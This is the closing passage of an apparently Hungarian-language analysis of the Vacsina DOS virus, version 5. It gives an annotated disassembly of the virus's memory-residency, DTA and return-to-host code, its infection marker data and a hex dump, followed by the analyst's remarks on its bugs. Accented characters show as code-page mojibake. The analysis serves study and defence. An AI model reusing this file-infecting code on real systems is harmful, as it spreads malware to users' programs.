0475 BAC000        MOV	DX,00C0             ;00C0-t¢l lesz az INT 21 rutin
0478 CD21          INT	21


     ;                  "A v°rus m†r a mem¢ri†ban van" jelzÇs

047A B80000        MOV	AX,0000
047D 8EC0          MOV	ES,AX
047F 26            ES:
0480 C706C5007F39  MOV	WORD PTR [00C5],397F;Azonos°t¢ sz¢
0486 26            ES:
0487 C606C70005    MOV	BYTE PTR [00C7],05  ;V°rus verzi¢sz†ma


     ;                   DTA be†ll°t†sa (rosszul!)

048C 8CC8          MOV	AX,CS
048E 8ED8          MOV	DS,AX
0490 B41A          MOV	AH,1A               ;SET_DTA_ADDRESS (ds:dx)
0492 BA5000        MOV	DX,0050             ;HIBA !!! 0080 kellene
0495 CD21          INT	21


     ;               Az eredeti program futtat†s†ra ugr†s

0497 2E            CS:
0498 8B47FB        MOV	AX,[BX-05]          ;ERE_AX (039A) Megj.:Teljesen felesle
						ges
049B E94EFF        JMP	03EC



     ;---------------------------------------------------------------
     ;  A file utols¢ 8 byteja tartalmazza a fontos inform†ci¢kat
     ;---------------------------------------------------------------

049E ERE_HOSSZ     DW   ?         ;A file eredeti hossza
04A0 ERE_2_3       DW   ?         ;A file eredeti 2.,3. byteja+0103
04A2 AZONOSITO     DW   7AF4      ;Azonos°t¢sz¢. Ez alapj†n ismeri fel a fertîzÇ
						st
04A4 VERZIOSZAM    DB   5         ;V°rus verzi¢sz†ma
04A5 ERE_1         DB   0         ;MÇg nem haszn†lt (az elsî byte mindig E9)


V°rus elejÇnek hexa dump-ja:

cs-1:0000  4D 07 00 4B 00 00 00 00-00 00 00 00 00 00 00 00   M..K............
cs-1:0010  72 0E AE 0F 56 05 20 0D-20 00 05 00 03 01 CD 21   r...V. . ......!
cs-1:0020  B4 00 CD 20 00 56 41 43-53 49 4E 41 20 20 20 20   ... .VACSINA
cs-1:0030  00 00 80 00 00 00 00 00-7C 11 37 A8 00 40 C2 00   ........|.7..@..
cs-1:0040  46 0A 00 00 00 00 00 00-00 20 20 20 20 20 20 20   F........
cs-1:0050  20 20 20 20 20 20 20 20-20 20 20 20 20 E8 00 00                ...


MegjegyzÇsek:

- A file eredeti idejÇt nem kÇredezi le, Çs nem †ll°tja vissza.
- DTA-t rosszul †ll°tja be. Ez a gyermekbetegsÇg a kÇsîbbi verzi¢kban is megmara
						dt.
- êrdekes, hogy az EXE k¢dj†t az 5A4D-t itt csak °gy haszn†lja, m°g a kÇsîbbi ve
						rzi¢k a 4D5A-t
  is haszn†lj†k.
- EXE-k COM-m† alak°t†sa ut†n nem tudom, hogy miÇrt nem mindj†rt a COM megfertîz
						Çse rÇszre ugrik.
- J¢p†r felesleges utas°t†s van a k¢dban, ami mÇg a kÇsîbbi verzi¢kban is megmar
						adt.
- A v°rus egÇsz mÅkîdÇse arra utal, hogy csak kisÇrletezÇsrîl van sz¢.
